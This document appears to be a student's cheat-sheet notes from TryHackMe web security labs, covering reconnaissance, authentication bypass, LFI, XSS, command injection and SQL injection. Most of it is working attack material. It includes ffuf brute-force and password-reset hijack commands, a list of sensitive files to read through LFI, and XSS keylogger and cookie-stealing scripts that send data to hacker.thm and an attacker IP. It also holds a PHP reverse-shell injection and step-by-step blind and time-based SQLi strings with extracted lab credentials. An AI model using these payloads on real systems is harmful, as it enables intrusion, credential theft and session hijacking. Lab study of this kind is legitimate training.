Walking an Application 
===
THM{CHANGE_DEFAULT_CREDENTIALS}
THM{HEADER_FLAG}

Content Discovery
===
`curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum` gives the md5sum of the favicon which can be looked up (for vulnerabilities) on 
### Tools
- [OWASP's db](https://wiki.owasp.org/index.php/OWASP_favicon_database)
- [Google Hacking/Dorking](https://en.wikipedia.org/wiki/Google_hacking
- [Wappalyzer](https://www.wappalyzer.com/)
- [Wayback Machine](https://archive.org/web/)
- [Amazon s3 buckets](http(s)://{name}.s3.amazonaws.com )
### Commands
`ffuf -w /home/kali/tools/SecLists/Discovery/Web-Content/common.txt -u http://10.10.170.250/FUZZ` was **quicker** than `dirb http://10.10.170.250/ /home/kali/tools/SecLists/Discovery/Web-Content/common.txt` but **less thorough**. `gobuster dir --url http://10.10.170.250/ -w /home/kali/tools/SecLists/Discovery/Web-Content/common.txt` was about the same as ffuf

Subdomain Discovery
===
Tools for publicly available dns:
- `sublist3r.py -d <domain>`
- `dnsrecon -t brt -d <domain>`
- Google search: -site:www.'domain'.com  site:*.'domain'.com --> this will exclude the main domain and only include subdomains

VPN:
	- `ffuf -w /path/to/wrdlist -u http://target -H "HOST: FUZZ.domain.com"`
	
	
AuthN Bypass
===
To find existing usernames:
`ffuf -w /home/kali/tools/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.172.127/customers/signup -mr "username already exists"`
To brute force login of these usernames:
`ffuf -w usernames.txt:W1,/home/kali/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.172.127/customers/login -fc 200`

Password Resets to own email:
`curl "http://10.10.172.127/customers/reset?email=robert%40acmeitsupport.thm" -H "Content-Type: application/x-www-form-urlencoded" -d "username=robert&email=attacker@me.com"`

LFI - Common Files to Try
===
|File|Description|
|---|---|
|etc/issue|contains a message or system identification to be printed before the login prompt.|
|/etc/profile|controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived|
|/proc/version|specifies the version of the Linux kernel|
|/etc/passwd|has all registered user that has access to a system|
|/etc/shadow|contains information about the system's users' passwords|
|/root/.bash_history|contains the history commands for root user|
|/var/log/dmessage|contains global system messages, including the messages that are logged during system startup|
|/var/mail/root|all emails for root user|
|/root/.ssh/id_rsa|Private SSH keys for a root or any known valid user on the server|
|/var/log/apache2/access.log|the accessed requests for Apache  webserver|
|C:\boot.ini|contains the boot options for computers with BIOS firmware|

LFI - Steps for Testing
===
   1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!
   2. Enter a valid input to see how the web server behaves.
   3. Enter invalid inputs, including special characters and common file names.
   4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
   5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
   6. Understand the input validation and if there are any filters!
   7. Try the inject a valid entry to read sensitive files


If the method is GET check if POST works & vice-versa: `curl -X POST http://10.10.14.112/challenges/chall3.php -d "method=POST&file=/etc/flag3%00" --output -`

XSS - Payloads
===
```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
``` 
^--> keylogger for a website which takes all the info written by the user to the evil website 
```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
--> session stealing
```

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
--> polyglot (aka wildcard)
```
</textarea><script>fetch('http://10.11.59.68:4444?cookie=' + document.cookie);</script>

```
--> cookie grabber

Command Injection
===
`127.0.0.1&&whoami` + `127.0.0.1&&cat /home/user/flag.txt`
[this](https://github.com/payloadbox/command-injection-payload-list) is a good cheat cheat
### fancier payloads:
got a reverse shell with `127.0.0.1&&php -r '$sock=fsockopen("10.11.59.68",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` and could also start a python server with `127.0.0.1&&python3 -m http.server 8000` to easily download files

SQLi
===
### lvl 1
finding name of db = `0 union select 1, 2, database()`
finding name of tables = `https://website.thm/article?id=0 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema = 'sqli_one';--`
--> results = sqli_one : _article_, _staff_users_
finding column names of table = `https://website.thm/article?id=0 union select 1, 2, group_concat(column_name) from information_schema.columns where table_name = 'staff_users';--`
--> results = _id_,_password_,_username_
(for article its _content_,_id_,_subject_)
`https://website.thm/article?id=0 union select 1, username, password from staff_users;--`
--> this gave the credentials _admin_:_p4ssword_
`https://website.thm/article?id=0 union select 1, 2, password from staff_users where username = 'martin';--`
--> result = [pa$$word]
``
--> would dump all usernames and passwords
### lvl 2
_admin_ + `' or 1=1;--'`
## lvl 3 --> blind sql
--> best way to go is bruteforcing, as you would have to figure out the names of the database, tables, etc chaacter by character using '%*character*'
`https://website.thm/checkuser?username=admin' union select 1, 2, database()'--` this returned true, and an error message showed the db name was _sqli_three_
--> the 'first' input must be a wrong one, otherwise the rest of the wuery might return _True_ even when not
`https://website.thm/checkuser?username=admin13' union select 1, 2, 3 from information_schema.tables where table_schema = 'sqli_three' and table_name like 'users';-- -`
`https://website.thm/checkuser?username=admin13' union select 1, 2, 3 from information_schema.columns where table_schema = 'sqli_three' and table_name = 'users' and column_name like 'id%';-- -`
--> found the id column, which then needs to be appended when continuing to test:
`https://website.thm/checkuser?username=admin13' union select 1, 2, 3 from information_schema.columns where table_schema = 'sqli_three' and table_name = 'users' and column_name like 'username%' and column_name != 'id';-- -`
--> which found username
`https://website.thm/checkuser?username=admin13' union select 1, 2, 3 from information_schema.columns where table_schema = 'sqli_three' and table_name = 'users' and column_name like 'password' and column_name != 'id' and column_name != 'username' ;-- -`
--> and password
`admin13' union select 1, 2, 3 from users where username like 'admin%' ;--`
--> obviously would work
`admin13' union select 1, 2, 3 from users where username = 'admin' and password like '3845%' ;--`
--> and we got the login _admin_:_3845_
### lvl 4
`https://website.thm/analytics?referrer=admin123' union select sleep(1), 2 where database() like 'sqli_four%' ;--`
--> database = sqli_four
`https://website.thm/analytics?referrer=admin123' union select sleep(1), 2 from information_schema.tables where table_schema = 'sqli_four' and table_name like 'users' ;--` 
--> got the table name users
`https://website.thm/analytics?referrer=admin123' union select sleep(1), 2 from information_schema.columns where table_schema = 'sqli_four' and table_name = 'users' and column_name like 'username' ;--`
--> _username_, _id_ and _password_
`https://website.thm/analytics?referrer=admin123' union select sleep(1), 2 from users where username = 'admin' and password like '4961%' ;--`
--> _admin_:_4961_